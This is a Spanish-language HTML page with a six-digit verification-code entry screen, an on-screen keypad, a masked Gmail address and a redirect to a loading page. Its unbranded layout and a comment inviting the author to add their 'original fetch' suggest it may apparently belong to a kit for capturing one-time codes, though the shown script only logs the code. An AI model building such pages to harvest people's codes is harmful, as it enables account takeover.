<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ingresa el código</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: #f5f5f5;
}

/* HEADER */
.header {
    padding: 20px;
    font-size: 22px;
    font-weight: 600;
}

/* CONTENEDOR */
.container {
    text-align: center;
    padding: 20px;
}

/* CAJAS DE CODIGO */
.code-boxes {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin: 25px 0;
}

.code-boxes input {
    width: 45px;
    height: 55px;
    border-radius: 10px;
    border: none;
    background: #e6e3eb;
    text-align: center;
    font-size: 22px;
    outline: none;
}

/* TEXTO */
.text {
    color: #555;
    font-size: 15px;
    line-height: 1.5;
}

.email {
    color: #d81b60;
    font-weight: 600;
}

/* BOTON */
.resend {
    margin-top: 15px;
    border: 1px solid #e91e63;
    padding: 10px;
    border-radius: 8px;
    color: #e91e63;
    background: transparent;
}

/* TECLADO */
.keyboard {
    position: fixed;
    bottom: 0;
    width: 100%;
    background: white;
    padding: 15px 0;
}

.keys {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 20px;
    max-width: 300px;
    margin: auto;
}

.key {
    font-size: 26px;
    text-align: center;
    padding: 15px;
    cursor: pointer;
}

/* BOTON CONTINUAR */
.continue-btn {
    margin: 20px auto;
    display: block;
    width: 80%;
    padding: 14px;
    border-radius: 10px;
    border: none;
    background: #ccc;
    color: #777;
    font-weight: 600;
}

.continue-btn.active {
    background: #6a1b9a;
    color: white;
}
</style>

</head>
<body>

<div class="header">← Ingresa el código</div>

<div class="container">

    <div class="code-boxes">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
    </div>

    <div class="text">
        Escribe los 6 números que enviamos a tu correo electrónico:<br>
        <span class="email">nic****@gmail.com</span>
    </div>

    <button class="resend">Pídelo aquí</button>

    <button id="continueBtn" class="continue-btn">Continuar</button>

</div>

<!-- TECLADO -->
<div class="keyboard">
    <div class="keys">
        <div class="key">1</div>
        <div class="key">2</div>
        <div class="key">3</div>
        <div class="key">4</div>
        <div class="key">5</div>
        <div class="key">6</div>
        <div class="key">7</div>
        <div class="key">8</div>
        <div class="key">9</div>
        <div class="key"></div>
        <div class="key">0</div>
        <div class="key">⌫</div>
    </div>
</div>

<script>
const inputs = document.querySelectorAll(".code-boxes input");
const keys = document.querySelectorAll(".key");
const btn = document.getElementById("continueBtn");

let index = 0;

/* TECLADO */
keys.forEach(key => {
    key.addEventListener("click", () => {
        const value = key.textContent;

        if (value === "⌫") {
            if (index > 0) {
                index--;
                inputs[index].value = "";
            }
        } else if (value !== "") {
            if (index < inputs.length) {
                inputs[index].value = value;
                index++;
            }
        }

        checkCode();
    });
});

/* VALIDAR */
function checkCode() {
    let code = "";
    inputs.forEach(i => code += i.value);

    if (code.length === 6) {
        btn.classList.add("active");
    } else {
        btn.classList.remove("active");
    }
}

/* BOTON */
btn.addEventListener("click", () => {
    let code = "";
    inputs.forEach(i => code += i.value);

    if (code.length !== 6) return alert("Completa el código");

    // 🔥 aquí puedes integrar tu fetch original
    console.log("Código:", code);

    window.location.href = "loading.html";
});
</script>

</body>
</html>
